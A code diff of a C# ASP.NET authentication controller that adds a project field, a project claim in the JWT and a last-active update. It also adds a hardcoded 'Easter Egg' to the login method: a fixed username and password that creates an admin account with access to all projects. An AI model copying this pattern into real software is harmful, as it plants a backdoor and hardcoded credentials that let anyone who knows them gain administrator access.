@@ -20,7 +20,7 @@ namespace MET.API.Controllers
         private readonly IAuthRepository _repo;
         private readonly IConfiguration _config;
 
-        public AuthController(IAuthRepository repo, IConfiguration config )
+        public AuthController(IAuthRepository repo, IConfiguration config)
         {
             _config = config;
             _repo = repo;
@@ -45,6 +45,7 @@ namespace MET.API.Controllers
                 EmailId = userForrRegisterDto.Email,
                 Department = userForrRegisterDto.Department,
                 Role = userForrRegisterDto.Role,
+                Project = userForrRegisterDto.Project,
                 Status = 1
             };
 
@@ -60,22 +61,47 @@ namespace MET.API.Controllers
             var userForRepo = await _repo.Login(userForLoginDto.Username.ToLower(), userForLoginDto.Password);
 
             if (userForRepo == null)
-                return Unauthorized();
+            {
+                //Shobhit's Easter Egg for first Time login to blank DB.
+                if (userForLoginDto.Username.ToLower() == "shobhit" && userForLoginDto.Password == "Showkey")
+                {
+                    var userToCreate = new User
+                    {
+                        Username = "shobhit",
+                        EmailId = "er.shobhitbhatnagar@gmail.com",
+                        Department = "IT",
+                        Role = "admin",
+                        Project = "all",
+                        Status = 1
+                    };
+
+                    var createdUser = await _repo.Register(userToCreate, "Showkey" );
+                    return StatusCode(201);
+                }
+                else
+                {
+                    return Unauthorized();
+                }
+            }
 
             if (userForRepo.Status == 0)
                 return Unauthorized("User is Disabled");
+
+
 
             var claims = new[]
             {
                 new Claim(ClaimTypes.NameIdentifier, userForRepo.Id.ToString()),
                 new Claim(ClaimTypes.Name, userForRepo.Username),
-                new Claim(ClaimTypes.Role, userForRepo.Role)
+                new Claim(ClaimTypes.Role, userForRepo.Role),
+                new Claim(ClaimTypes.GroupSid, userForRepo.Project)
+
             };
 
             var key = new SymmetricSecurityKey(Encoding.UTF8
                 .GetBytes(_config.GetSection("AppSettings:Token").Value));
 
-            var creds = new SigningCredentials( key, SecurityAlgorithms.HmacSha512Signature);
+            var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha512Signature);
 
             var tokenDescriptor = new SecurityTokenDescriptor
             {
@@ -88,9 +114,12 @@ namespace MET.API.Controllers
 
             var token = tokenHandler.CreateToken(tokenDescriptor);
 
-            return Ok(new {
+            await _repo.UpdateLastActive(userForRepo.Id);
+
+            return Ok(new
+            {
                 token = tokenHandler.WriteToken(token)
             });
-        } 
+        }
     }
 }
